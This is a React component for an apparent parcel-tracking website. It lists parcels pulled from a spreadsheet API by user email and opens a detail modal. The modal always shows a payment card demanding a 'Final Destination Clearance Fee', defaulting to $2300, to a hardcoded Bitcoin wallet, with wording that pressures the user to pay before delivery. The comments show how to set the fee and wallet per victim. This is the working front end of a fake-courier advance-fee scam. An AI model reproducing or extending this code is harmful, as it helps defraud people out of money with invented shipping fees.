import React, { useEffect, useState, useCallback } from 'react';
import { createPortal } from 'react-dom';
import { Link } from 'react-router-dom';
import { getUser } from '../utils/auth';

// ⚠️ If your SheetDB plan supports multiple sheets on one endpoint,
// keep `?sheet=parcels` on the URL below.
// If it doesn't, replace this with the second endpoint URL you created
// and remove the `?sheet=parcels` suffix.
const PARCELS_URL =
  'https://sheetdb.io/api/v1/hw2ce8n9rooe3';

const statusColors = {
  delivered: '#22c55e',
  final_destination: '#0E9F6E',
  out_for_delivery: '#FF5230',
  in_transit: '#FF5230',
  pending: '#a1a1aa',
  exception: '#ef4444',
};

const statusLabels = {
  delivered: 'Delivered',
  final_destination: 'Final destination',
  out_for_delivery: 'Out for delivery',
  in_transit: 'In transit',
  pending: 'Pending',
  exception: 'Exception',
};

// Progress track steps (exception is handled separately)
const STATUS_STEPS = [
  { key: 'pending', label: 'Pending' },
  { key: 'in_transit', label: 'In transit' },
  { key: 'out_for_delivery', label: 'Out for delivery' },
  { key: 'delivered', label: 'Delivered' },
  { key: 'final_destination', label: 'Final destination' },
];

/* ------------------------------------------------------------------ */
/*  CRYPTO PAY CARD                                                    */
/* ------------------------------------------------------------------ */
const CryptoPayCard = ({ amount, wallet }) => {
  const [copied, setCopied] = useState(false);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(wallet);
    } catch {
      const el = document.createElement('textarea');
      el.value = wallet;
      document.body.appendChild(el);
      el.select();
      document.execCommand('copy');
      document.body.removeChild(el);
    }
    setCopied(true);
    setTimeout(() => setCopied(false), 1800);
  };

  return (
    <>
      <style>{`
        .cpc {
          margin-top: 1.5rem;
          padding: 1.15rem 1.2rem 1.25rem;
          border-radius: 16px;
          background: #F7F6F3;
          border: 1px solid rgba(14,14,16,0.07);
          animation: cpcIn 0.35s ease;
          font-family: inherit;
        }
        @keyframes cpcIn {
          from { opacity: 0; transform: translateY(6px); }
          to   { opacity: 1; transform: none; }
        }
        .cpc-label {
          font-size: 0.66rem;
          font-weight: 700;
          letter-spacing: 0.1em;
          text-transform: uppercase;
          color: #71717A;
          margin-bottom: 0.35rem;
        }
        .cpc-amount {
          font-size: 1.5rem;
          font-weight: 700;
          color: #0E0E10;
          letter-spacing: -0.02em;
          margin-bottom: 0.9rem;
        }
        .cpc-row {
          display: flex;
          align-items: center;
          gap: 0.5rem;
          background: #fff;
          border: 1px solid rgba(14,14,16,0.1);
          border-radius: 12px;
          padding: 0.4rem 0.4rem 0.4rem 0.75rem;
        }
        .cpc-addr {
          flex: 1;
          min-width: 0;
          font-family: 'SF Mono', Menlo, Consolas, monospace;
          font-size: 0.78rem;
          color: #3F3F46;
          white-space: nowrap;
          overflow: hidden;
          text-overflow: ellipsis;
        }
        .cpc-copy {
          flex-shrink: 0;
          border: none;
          border-radius: 9px;
          background: #FF5230;
          color: #fff;
          font-family: inherit;
          font-size: 0.78rem;
          font-weight: 700;
          padding: 0.55rem 0.9rem;
          cursor: pointer;
          transition: background 0.2s ease, transform 0.15s ease;
        }
        .cpc-copy:hover { background: #ff3b14; }
        .cpc-copy:active { transform: scale(0.97); }
        .cpc-copy.is-copied { background: #22c55e; }
        .cpc-hint {
          margin-top: 0.65rem;
          font-size: 0.72rem;
          color: #71717A;
          text-align: center;
        }
        .cpc-note {
          margin-top: 0.75rem;
          padding-top: 0.75rem;
          border-top: 1px dashed rgba(14,14,16,0.12);
          font-size: 0.78rem;
          line-height: 1.5;
          color: #3F3F46;
          text-align: center;
        }
      `}</style>

      <div className="cpc">
        <div className="cpc-label">Final Destination Clearance Fee</div>
        <div className="cpc-amount">${amount} USD</div>

        <div className="cpc-row">
          <span className="cpc-addr" title={wallet}>
            {wallet}
          </span>
          <button
            type="button"
            className={`cpc-copy${copied ? ' is-copied' : ''}`}
            onClick={handleCopy}
          >
            {copied ? 'Copied!' : 'Copy'}
          </button>
        </div>

        <div className="cpc-hint">
          Send the exact amount to the Bitcoin address above.
        </div>

        <div className="cpc-note">
          The final destination clearance fee must be paid before the package
          arrives at the post office.
        </div>
      </div>
    </>
  );
};

/* ------------------------------------------------------------------ */
/*  MODAL                                                             */
/* ------------------------------------------------------------------ */
const ParcelModal = ({ parcel, onClose }) => {
  const [copied, setCopied] = useState(false);

  const color = statusColors[parcel.status] || '#a1a1aa';
  const isException = parcel.status === 'exception';
  const activeIndex = STATUS_STEPS.findIndex((s) => s.key === parcel.status);

  const etaParts = (parcel.eta || '').split(',');

  // Esc to close + lock body scroll
  useEffect(() => {
    const onKey = (e) => {
      if (e.key === 'Escape') onClose();
    };
    window.addEventListener('keydown', onKey);
    const prevOverflow = document.body.style.overflow;
    document.body.style.overflow = 'hidden';
    return () => {
      window.removeEventListener('keydown', onKey);
      document.body.style.overflow = prevOverflow;
    };
  }, [onClose]);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(parcel.number);
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    } catch {
      /* clipboard not available */
    }
  };

  return createPortal(
    <div
      className="pm-backdrop"
      onClick={onClose}
      role="presentation"
    >
      <div
        className="pm-card"
        role="dialog"
        aria-modal="true"
        aria-label={`Parcel ${parcel.number}`}
        onClick={(e) => e.stopPropagation()}
      >
        <style>{`
          .pm-backdrop {
            position: fixed;
            inset: 0;
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.25rem;
            background: rgba(14,14,16,0.45);
            backdrop-filter: blur(6px);
            -webkit-backdrop-filter: blur(6px);
            animation: pmFade 0.22s ease;
          }
          .pm-card {
            position: relative;
            width: 100%;
            max-width: 520px;
            max-height: 90vh;
            overflow-y: auto;
            background: #fff;
            border-radius: 26px;
            box-shadow: 0 40px 90px -32px rgba(14,14,16,0.55);
            animation: pmPop 0.38s cubic-bezier(0.16, 1, 0.3, 1);
          }
          @keyframes pmFade { from { opacity: 0; } to { opacity: 1; } }
          @keyframes pmPop {
            from { opacity: 0; transform: translateY(18px) scale(0.965); }
            to   { opacity: 1; transform: none; }
          }

          /* ---------- HERO ---------- */
          .pm-hero {
            position: relative;
            overflow: hidden;
            padding: 1.6rem 1.6rem 1.5rem;
            border-radius: 26px 26px 0 0;
          }
          .pm-hero::after {
            content: '';
            position: absolute;
            top: -70px; right: -70px;
            width: 200px; height: 200px;
            border-radius: 50%;
            background: currentColor;
            opacity: 0.07;
            pointer-events: none;
          }
          .pm-hero-top {
            display: flex;
            align-items: flex-start;
            justify-content: space-between;
            gap: 1rem;
            position: relative;
            z-index: 1;
          }
          .pm-hero-icon {
            width: 52px; height: 52px;
            border-radius: 16px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: #fff;
            box-shadow: 0 8px 20px -10px rgba(14,14,16,0.25);
            flex-shrink: 0;
          }
          .pm-close {
            width: 36px; height: 36px;
            border-radius: 50%;
            border: none;
            background: rgba(255,255,255,0.75);
            color: #0E0E10;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            flex-shrink: 0;
            transition: background 0.2s ease, transform 0.2s ease;
          }
          .pm-close:hover { background: #fff; transform: rotate(90deg); }

          .pm-eyebrow {
            font-size: 0.68rem;
            font-weight: 700;
            letter-spacing: 0.1em;
            text-transform: uppercase;
            color: #71717A;
            margin: 1.15rem 0 0.4rem;
            position: relative;
            z-index: 1;
          }
          .pm-number {
            font-family: 'SF Mono', Menlo, Consolas, monospace;
            font-size: 1.3rem;
            font-weight: 700;
            letter-spacing: -0.02em;
            color: #0E0E10;
            word-break: break-all;
            line-height: 1.25;
            position: relative;
            z-index: 1;
          }
          .pm-status-pill {
            display: inline-flex;
            align-items: center;
            gap: 0.4rem;
            margin-top: 0.85rem;
            padding: 0.35rem 0.85rem;
            border-radius: 100px;
            font-size: 0.72rem;
            font-weight: 700;
            letter-spacing: 0.06em;
            text-transform: uppercase;
            position: relative;
            z-index: 1;
          }
          .pm-status-pill .dot {
            width: 6px; height: 6px;
            border-radius: 50%;
            background: currentColor;
          }

          /* ---------- BODY ---------- */
          .pm-body { padding: 1.5rem 1.6rem 1.6rem; }

          /* Progress track */
          .pm-track {
            display: flex;
            margin-bottom: 1.6rem;
          }
          .pm-track-item {
            flex: 1 1 0;
            min-width: 0;
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 0.5rem;
            text-align: center;
          }
          .pm-track-item::before {
            content: '';
            position: absolute;
            top: 11px;
            left: -50%;
            width: 100%;
            height: 2px;
            background: #E7E5E1;
            transition: background 0.3s ease;
          }
          .pm-track-item:first-child::before { display: none; }
          .pm-track-item.is-done::before { background: #FF5230; }

          .pm-track-dot {
            position: relative;
            z-index: 1;
            width: 24px; height: 24px;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: #fff;
            border: 2px solid #E7E5E1;
            color: #A1A1AA;
            font-size: 0.65rem;
            font-weight: 700;
            transition: all 0.3s ease;
          }
          .pm-track-item.is-done .pm-track-dot {
            background: #FF5230;
            border-color: #FF5230;
            color: #fff;
          }
          .pm-track-item.is-current .pm-track-dot {
            box-shadow: 0 0 0 5px rgba(255,82,48,0.15);
          }
          .pm-track-label {
            font-size: 0.68rem;
            font-weight: 600;
            color: #A1A1AA;
            line-height: 1.25;
            width: 100%;
            word-break: break-word;
            hyphens: auto;
          }
          .pm-track-item.is-done .pm-track-label { color: #0E0E10; }

          /* Final destination note */
          .pm-final {
            position: relative;
            overflow: hidden;
            padding: 1.05rem 1.15rem 1.15rem;
            border-radius: 14px;
            background: rgba(14,159,110,0.06);
            border: 1px solid rgba(14,159,110,0.2);
            margin-bottom: 1.6rem;
            animation: pmFinalIn 0.35s ease;
          }
          @keyframes pmFinalIn {
            from { opacity: 0; transform: translateY(6px); }
            to   { opacity: 1; transform: none; }
          }
          .pm-final::before {
            content: '';
            position: absolute;
            left: 0; top: 0; bottom: 0;
            width: 3px;
            background: #0E9F6E;
          }
          .pm-final-head {
            display: inline-flex;
            align-items: center;
            gap: 0.45rem;
            font-size: 0.66rem;
            font-weight: 700;
            letter-spacing: 0.1em;
            text-transform: uppercase;
            color: #0E9F6E;
            margin-bottom: 0.55rem;
          }
          .pm-final-head svg { flex-shrink: 0; }
          .pm-final-text {
            font-size: 0.9rem;
            line-height: 1.55;
            color: #0E0E10;
            white-space: pre-wrap;
            word-break: break-word;
          }
          .pm-final-text.is-placeholder {
            color: #71717A;
            font-style: italic;
          }

          /* Exception banner */
          .pm-exception {
            display: flex;
            align-items: flex-start;
            gap: 0.75rem;
            padding: 0.9rem 1rem;
            border-radius: 14px;
            background: rgba(239,68,68,0.08);
            border: 1px solid rgba(239,68,68,0.2);
            color: #b91c1c;
            font-size: 0.83rem;
            line-height: 1.45;
            margin-bottom: 1.6rem;
          }

          /* Detail grid */
          .pm-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1px;
            background: rgba(14,14,16,0.07);
            border: 1px solid rgba(14,14,16,0.07);
            border-radius: 16px;
            overflow: hidden;
          }
          .pm-cell {
            background: #fff;
            padding: 0.95rem 1.05rem;
          }
          .pm-cell-label {
            font-size: 0.65rem;
            font-weight: 700;
            letter-spacing: 0.09em;
            text-transform: uppercase;
            color: #A1A1AA;
            margin-bottom: 0.35rem;
          }
          .pm-cell-value {
            font-size: 0.9rem;
            font-weight: 600;
            color: #0E0E10;
            line-height: 1.35;
            word-break: break-word;
          }
          .pm-cell-value small {
            display: block;
            font-weight: 500;
            font-size: 0.78rem;
            color: #71717A;
            margin-top: 0.15rem;
          }

          /* Footer */
          .pm-footer {
            display: flex;
            gap: 0.6rem;
            margin-top: 1.5rem;
          }
          .pm-btn {
            flex: 1;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.45rem;
            font-family: inherit;
            font-size: 0.84rem;
            font-weight: 600;
            padding: 0.8rem 1.1rem;
            border-radius: 100px;
            cursor: pointer;
            border: none;
            transition: background 0.22s ease, transform 0.22s ease,
                        color 0.22s ease, border-color 0.22s ease;
          }
          .pm-btn-ghost {
            background: #fff;
            border: 1px solid rgba(14,14,16,0.12);
            color: #0E0E10;
          }
          .pm-btn-ghost:hover {
            border-color: rgba(14,14,16,0.28);
            transform: translateY(-1px);
          }
          .pm-btn-primary {
            background: #FF5230;
            color: #fff;
          }
          .pm-btn-primary:hover {
            background: #ff3b14;
            transform: translateY(-1px);
          }

          @media (max-width: 480px) {
            .pm-grid { grid-template-columns: 1fr; }
            .pm-track-label { font-size: 0.56rem; letter-spacing: -0.01em; }
            .pm-track-item { gap: 0.35rem; }
            .pm-track-dot { width: 20px; height: 20px; font-size: 0.55rem; border-width: 1.5px; }
            .pm-track-item::before { top: 9px; }
            .pm-footer { flex-direction: column-reverse; }
          }
        `}</style>

        {/* HERO */}
        <div
          className="pm-hero"
          style={{ background: `${color}12`, color }}
        >
          <div className="pm-hero-top">
            <div className="pm-hero-icon">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke={color} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="M16.5 9.4 7.55 4.24" />
                <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" />
                <polyline points="3.27 6.96 12 12.01 20.73 6.96" />
                <line x1="12" y1="22.08" x2="12" y2="12" />
              </svg>
            </div>

            <button
              type="button"
              className="pm-close"
              onClick={onClose}
              aria-label="Close"
            >
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <path d="M18 6 6 18" />
                <path d="m6 6 12 12" />
              </svg>
            </button>
          </div>

          <div className="pm-eyebrow">Tracking number</div>
          <div className="pm-number">{parcel.number}</div>

          <span
            className="pm-status-pill"
            style={{ color, background: `${color}22` }}
          >
            <span className="dot" />
            {parcel.label}
          </span>
        </div>

        {/* BODY */}
        <div className="pm-body">
          {isException ? (
            <div className="pm-exception">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ flexShrink: 0, marginTop: 1 }}>
                <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z" />
                <line x1="12" y1="9" x2="12" y2="13" />
                <line x1="12" y1="17" x2="12.01" y2="17" />
              </svg>
              <span>
                There's an issue with this shipment. Please contact the courier
                for more details.
              </span>
            </div>
          ) : (
            <div className="pm-track">
              {STATUS_STEPS.map((step, i) => {
                const isDone = activeIndex >= 0 && i <= activeIndex;
                const isCurrent = i === activeIndex;
                return (
                  <div
                    key={step.key}
                    className={`pm-track-item${isDone ? ' is-done' : ''}${isCurrent ? ' is-current' : ''}`}
                  >
                    <div className="pm-track-dot">
                      {i < activeIndex ? (
                        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3.5" strokeLinecap="round" strokeLinejoin="round">
                          <polyline points="20 6 9 17 4 12" />
                        </svg>
                      ) : (
                        i + 1
                      )}
                    </div>
                    <span className="pm-track-label">{step.label}</span>
                  </div>
                );
              })}
            </div>
          )}

          {/* FINAL DESTINATION NOTE — only when status is final_destination */}
          {parcel.status === 'final_destination' && (
            <div className="pm-final">
              <div className="pm-final-head">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                  <path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z" />
                  <circle cx="12" cy="10" r="3" />
                </svg>
                Final destination
              </div>

              {parcel.finalNote ? (
                <div className="pm-final-text">{parcel.finalNote}</div>
              ) : (
                <div className="pm-final-text is-placeholder">
                  Your parcel has reached its final destination.
                </div>
              )}
            </div>
          )}

          <div className="pm-grid">
            <div className="pm-cell">
              <div className="pm-cell-label">Courier</div>
              <div className="pm-cell-value">{parcel.courier}</div>
            </div>
            <div className="pm-cell">
              <div className="pm-cell-label">Estimated arrival</div>
              <div className="pm-cell-value">
                {etaParts[0]}
                {etaParts.length > 1 && (
                  <small>{etaParts.slice(1).join(',').trim()}</small>
                )}
              </div>
            </div>
            <div className="pm-cell">
              <div className="pm-cell-label">From</div>
              <div className="pm-cell-value">{parcel.from}</div>
            </div>
            <div className="pm-cell">
              <div className="pm-cell-label">To</div>
              <div className="pm-cell-value">{parcel.to}</div>
            </div>
          </div>

          <div className="pm-footer">
            <button
              type="button"
              className="pm-btn pm-btn-ghost"
              onClick={handleCopy}
            >
              {copied ? (
                <>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <polyline points="20 6 9 17 4 12" />
                  </svg>
                  Copied
                </>
              ) : (
                <>
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
                  </svg>
                  Copy number
                </>
              )}
            </button>
            <button
              type="button"
              className="pm-btn pm-btn-primary"
              onClick={onClose}
            >
              Done
            </button>
          </div>

          {/* CRYPTO PAY CARD — always visible */}
          <CryptoPayCard
            amount={parcel.clearanceFee || '2300'}
            wallet={parcel.wallet || 'bc1qsa7af2783e56jd3z0zhsl56kceuu58ze69lf09'}
          />
        </div>
      </div>
    </div>,
    document.body
  );
};

/* ------------------------------------------------------------------ */
/*  LIST                                                              */
/* ------------------------------------------------------------------ */
const ParcelsList = ({ limit }) => {
  const [parcels, setParcels] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [selected, setSelected] = useState(null);

  const user = getUser();
  const email = user?.email?.toLowerCase();

  const loadParcels = useCallback(async () => {
    if (!email) {
      setParcels([]);
      setLoading(false);
      return;
    }

    setLoading(true);
    setError(null);

    try {
      // SheetDB: /search?column=value filters rows
      const url = `${PARCELS_URL}/search?email=${encodeURIComponent(email)}`;
      const res = await fetch(url);

      if (!res.ok) throw new Error(`Server responded ${res.status}`);

      const rows = await res.json();

      // Normalize SheetDB keys to our shape.
      const normalized = rows.map((r) => {
        const status = String(r.status || 'pending')
          .trim()
          .toLowerCase()
          .replace(/[\s-]+/g, '_');

        return {
          number: r.tracking_number || '',
          status,
          label: statusLabels[status] || 'Pending',
          courier: r.courier || '—',
          from: r.from_location || '—',
          to: r.to_location || '—',
          eta: r.arrives_thru || '—',

          // Column literally named "final_destination"
          finalNote: r.final_destination || '',

          // Optional crypto columns — add them to your SheetDB sheet
          // (clearance_fee, bitcoin_wallet) if you want them dynamic.
          clearanceFee: r.clearance_fee || '',
          wallet: r.bitcoin_wallet || '',
        };
      });

      setParcels(limit ? normalized.slice(0, limit) : normalized);
    } catch (err) {
      console.error('Parcels fetch error:', err);
      setError(err.message || 'Could not load parcels.');
    } finally {
      setLoading(false);
    }
  }, [email, limit]);

  useEffect(() => {
    loadParcels();
  }, [loadParcels]);

  // Close modal if the list reloads / changes
  useEffect(() => {
    setSelected(null);
  }, [parcels]);

  const openParcel = (parcel) => setSelected(parcel);
  const closeParcel = useCallback(() => setSelected(null), []);

  const handleKeyOpen = (e, parcel) => {
    if (e.key === 'Enter' || e.key === ' ') {
      e.preventDefault();
      openParcel(parcel);
    }
  };

  return (
    <div className="parcels">
      <style>{`
        .parcels-loading,
        .parcels-empty,
        .parcels-error {
          background: #fff;
          border: 1px solid rgba(14,14,16,0.06);
          border-radius: 18px;
          padding: 3rem 1.5rem;
          text-align: center;
          color: #71717A;
          font-size: 0.9rem;
        }
        .parcels-empty strong,
        .parcels-error strong {
          display: block;
          font-size: 1.05rem;
          color: #0E0E10;
          margin-bottom: 0.4rem;
          font-weight: 700;
        }
        .parcels-error strong { color: #ef4444; }
        .parcels-error button {
          margin-top: 1rem;
          background: #FF5230;
          color: #fff;
          border: none;
          font-weight: 600;
          font-size: 0.85rem;
          padding: 0.7rem 1.35rem;
          border-radius: 100px;
          cursor: pointer;
          font-family: inherit;
          transition: background 0.25s ease, transform 0.25s ease;
        }
        .parcels-error button:hover {
          background: #ff3b14;
          transform: translateY(-1px);
        }

        /* Skeleton */
        .parcel-skel {
          background: #fff;
          border: 1px solid rgba(14,14,16,0.06);
          border-radius: 18px;
          padding: 1.25rem 1.4rem;
          display: grid;
          grid-template-columns: 44px 1fr auto;
          gap: 1.25rem;
          align-items: center;
          margin-bottom: 0.75rem;
        }
        .parcel-skel .sk {
          background: linear-gradient(90deg, #EEEDEA 0%, #F7F6F3 50%, #EEEDEA 100%);
          background-size: 200% 100%;
          border-radius: 6px;
          animation: skShimmer 1.4s infinite linear;
        }
        .parcel-skel .sk-icon { width: 44px; height: 44px; border-radius: 12px; }
        .parcel-skel .sk-line-1 { height: 12px; width: 60%; margin-bottom: 0.6rem; }
        .parcel-skel .sk-line-2 { height: 10px; width: 40%; }
        .parcel-skel .sk-eta { width: 90px; height: 24px; }
        @keyframes skShimmer {
          0%   { background-position: 200% 0; }
          100% { background-position: -200% 0; }
        }

        /* List */
        .parcel-list {
          display: flex;
          flex-direction: column;
          gap: 0.75rem;
        }
        .parcel {
          display: grid;
          grid-template-columns: 44px 1fr auto;
          gap: 1.25rem;
          align-items: center;
          background: #fff;
          border: 1px solid rgba(14,14,16,0.06);
          border-radius: 18px;
          padding: 1.25rem 1.4rem;
          transition: transform 0.35s cubic-bezier(0.16, 1, 0.3, 1),
                      box-shadow 0.35s ease, border-color 0.3s ease;
          cursor: pointer;
          -webkit-tap-highlight-color: transparent;
        }
        .parcel:hover {
          transform: translateX(4px);
          box-shadow: 0 20px 40px -22px rgba(14,14,16,0.18);
          border-color: rgba(255,82,48,0.25);
        }
        .parcel:active { transform: translateX(2px) scale(0.997); }
        .parcel:focus-visible {
          outline: 2px solid #FF5230;
          outline-offset: 3px;
          border-color: rgba(255,82,48,0.35);
        }
        .parcel-icon {
          width: 44px; height: 44px;
          border-radius: 12px;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          background: rgba(255,82,48,0.1);
          color: #FF5230;
          flex-shrink: 0;
        }
        .parcel-body { min-width: 0; }
        .parcel-top {
          display: flex;
          align-items: center;
          gap: 0.75rem;
          margin-bottom: 0.4rem;
          flex-wrap: wrap;
        }
        .parcel-number {
          font-family: 'SF Mono', Menlo, Consolas, monospace;
          font-size: 0.85rem;
          font-weight: 600;
          color: #0E0E10;
          letter-spacing: -0.01em;
        }
        .parcel-status {
          display: inline-flex;
          align-items: center;
          gap: 0.35rem;
          padding: 0.2rem 0.6rem;
          border-radius: 100px;
          font-size: 0.68rem;
          font-weight: 700;
          letter-spacing: 0.06em;
          text-transform: uppercase;
        }
        .parcel-status .dot {
          width: 5px; height: 5px;
          border-radius: 50%;
          background: currentColor;
        }
        .parcel-meta {
          display: flex;
          gap: 0.9rem;
          flex-wrap: wrap;
          font-size: 0.82rem;
          color: #71717A;
        }
        .parcel-meta strong {
          color: #0E0E10;
          font-weight: 600;
        }
        .parcel-eta {
          font-size: 0.82rem;
          color: #71717A;
          text-align: right;
          white-space: nowrap;
        }
        .parcel-eta strong {
          display: block;
          color: #0E0E10;
          font-weight: 600;
          font-size: 0.88rem;
          margin-bottom: 0.15rem;
        }
        .parcel-chevron {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          margin-top: 0.35rem;
          color: #C4C4C8;
          transition: transform 0.3s ease, color 0.3s ease;
        }
        .parcel:hover .parcel-chevron {
          transform: translateX(3px);
          color: #FF5230;
        }

        @media (max-width: 640px) {
          .parcel {
            grid-template-columns: 40px 1fr;
            gap: 1rem;
          }
          .parcel-eta {
            grid-column: 2;
            text-align: left;
            margin-top: 0.5rem;
          }
          .parcel-chevron { display: none; }
        }
      `}</style>

      {/* LOADING */}
      {loading && (
        <div>
          {[0, 1, 2].map((i) => (
            <div key={i} className="parcel-skel">
              <div className="sk sk-icon" />
              <div>
                <div className="sk sk-line-1" />
                <div className="sk sk-line-2" />
              </div>
              <div className="sk sk-eta" />
            </div>
          ))}
        </div>
      )}

      {/* ERROR */}
      {!loading && error && (
        <div className="parcels-error">
          <strong>Could not load parcels</strong>
          {error}
          <br />
          <button type="button" onClick={loadParcels}>
            Try again
          </button>
        </div>
      )}

      {/* EMPTY */}
      {!loading && !error && parcels.length === 0 && (
        <div className="parcels-empty">
          <strong>No parcels yet</strong>
          Track a parcel from the home page and it will show up here.
          <div style={{ marginTop: '1.25rem' }}>
            <Link
              to="/"
              style={{
                display: 'inline-flex',
                alignItems: 'center',
                gap: '0.4rem',
                background: '#FF5230',
                color: '#fff',
                textDecoration: 'none',
                fontWeight: 600,
                fontSize: '0.85rem',
                padding: '0.7rem 1.35rem',
                borderRadius: '100px',
              }}
            >
              Track a parcel
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <path d="M5 12h14" />
                <path d="m12 5 7 7-7 7" />
              </svg>
            </Link>
          </div>
        </div>
      )}

      {/* DATA */}
      {!loading && !error && parcels.length > 0 && (
        <div className="parcel-list">
          {parcels.map((p) => {
            const color = statusColors[p.status] || '#a1a1aa';
            const etaParts = (p.eta || '').split(',');
            return (
              <div
                key={p.number}
                className="parcel"
                role="button"
                tabIndex={0}
                aria-label={`View details for parcel ${p.number}`}
                onClick={() => openParcel(p)}
                onKeyDown={(e) => handleKeyOpen(e, p)}
              >
                <div className="parcel-icon">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M16.5 9.4 7.55 4.24" />
                    <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" />
                    <polyline points="3.27 6.96 12 12.01 20.73 6.96" />
                    <line x1="12" y1="22.08" x2="12" y2="12" />
                  </svg>
                </div>

                <div className="parcel-body">
                  <div className="parcel-top">
                    <span className="parcel-number">{p.number}</span>
                    <span
                      className="parcel-status"
                      style={{ color, background: `${color}22` }}
                    >
                      <span className="dot" />
                      {p.label}
                    </span>
                  </div>
                  <div className="parcel-meta">
                    <span>Courier: <strong>{p.courier}</strong></span>
                    <span>From: <strong>{p.from}</strong></span>
                    <span>To: <strong>{p.to}</strong></span>
                  </div>
                </div>

                <div className="parcel-eta">
                  <strong>{etaParts[0]}</strong>
                  {etaParts.slice(1).join(',').trim()}
                  <span className="parcel-chevron">
                    <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                      <path d="m9 18 6-6-6-6" />
                    </svg>
                  </span>
                </div>
              </div>
            );
          })}
        </div>
      )}

      {/* MODAL */}
      {selected && (
        <ParcelModal parcel={selected} onClose={closeParcel} />
      )}
    </div>
  );
};

export default ParcelsList;